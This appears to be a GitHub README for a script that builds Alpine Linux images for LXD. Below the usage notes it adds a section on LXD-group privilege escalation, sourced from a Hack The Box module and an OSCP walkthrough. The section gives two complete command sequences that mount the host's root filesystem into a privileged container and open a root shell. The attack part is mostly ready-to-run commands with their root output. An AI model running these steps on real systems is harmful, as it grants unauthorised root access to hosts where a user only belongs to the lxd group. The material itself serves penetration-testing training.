
# LXD Alpine Linux image builder

This script provides a way to create [Alpine Linux](http://alpinelinux.org/)
images for their use with [LXD](https://linuxcontainers.org/lxd/).
It's based off the LXC templates.

The image will be built just by installing the `alpine-base` meta-package.
Networking and syslog are enabled by default.


## Usage

In order to build the latest Alpine image just run the script (must be done
as root):

    sudo ./build-alpine

For more options check the help:

    sudo ./build-alpine -h

After the image is built it can be added as an image to LXD as follows:

    lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine-v3.3


## LXD group privilege escalation
Source (method-1): https://academy.hackthebox.com/module/51/section/477

Source (method-2): https://falconspy.medium.com/infosec-prep-oscp-vulnhubwalkthrough-a09519236025

- Confirm the group
`id`

- Clone the repository
```
git clone https://github.com/ertaku12/lxd-alpine-builder.git

cd lxd-alpine-builder/
```

- Find the binary

```
find / -type f -name lxc 2>/dev/null

find / -type f -name lxd 2>/dev/null
```

- Exploit method-1
```bash
lxd init

lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine

lxc init alpine r00t -c security.privileged=true

lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

lxc start r00t

lxc exec r00t /bin/sh

# id
uid=0(root) gid=0(root)

cd /mnt/root/root
cat proof.txt
```

- Exploit method-2
```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias trenchesofit

lxc image list

lxc storage create pool dir

lxc profile device add default root disk path=/ pool=pool

lxc init trenchesofit ignite -c security.privileged=true

lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true

lxc start ignite

lxc exec ignite /bin/sh

# id
uid=0(root) gid=0(root)

cd /mnt/root/root
cat proof.txt
```



## License

This script uses the same license as the script it was derived from: LGPL 2.1

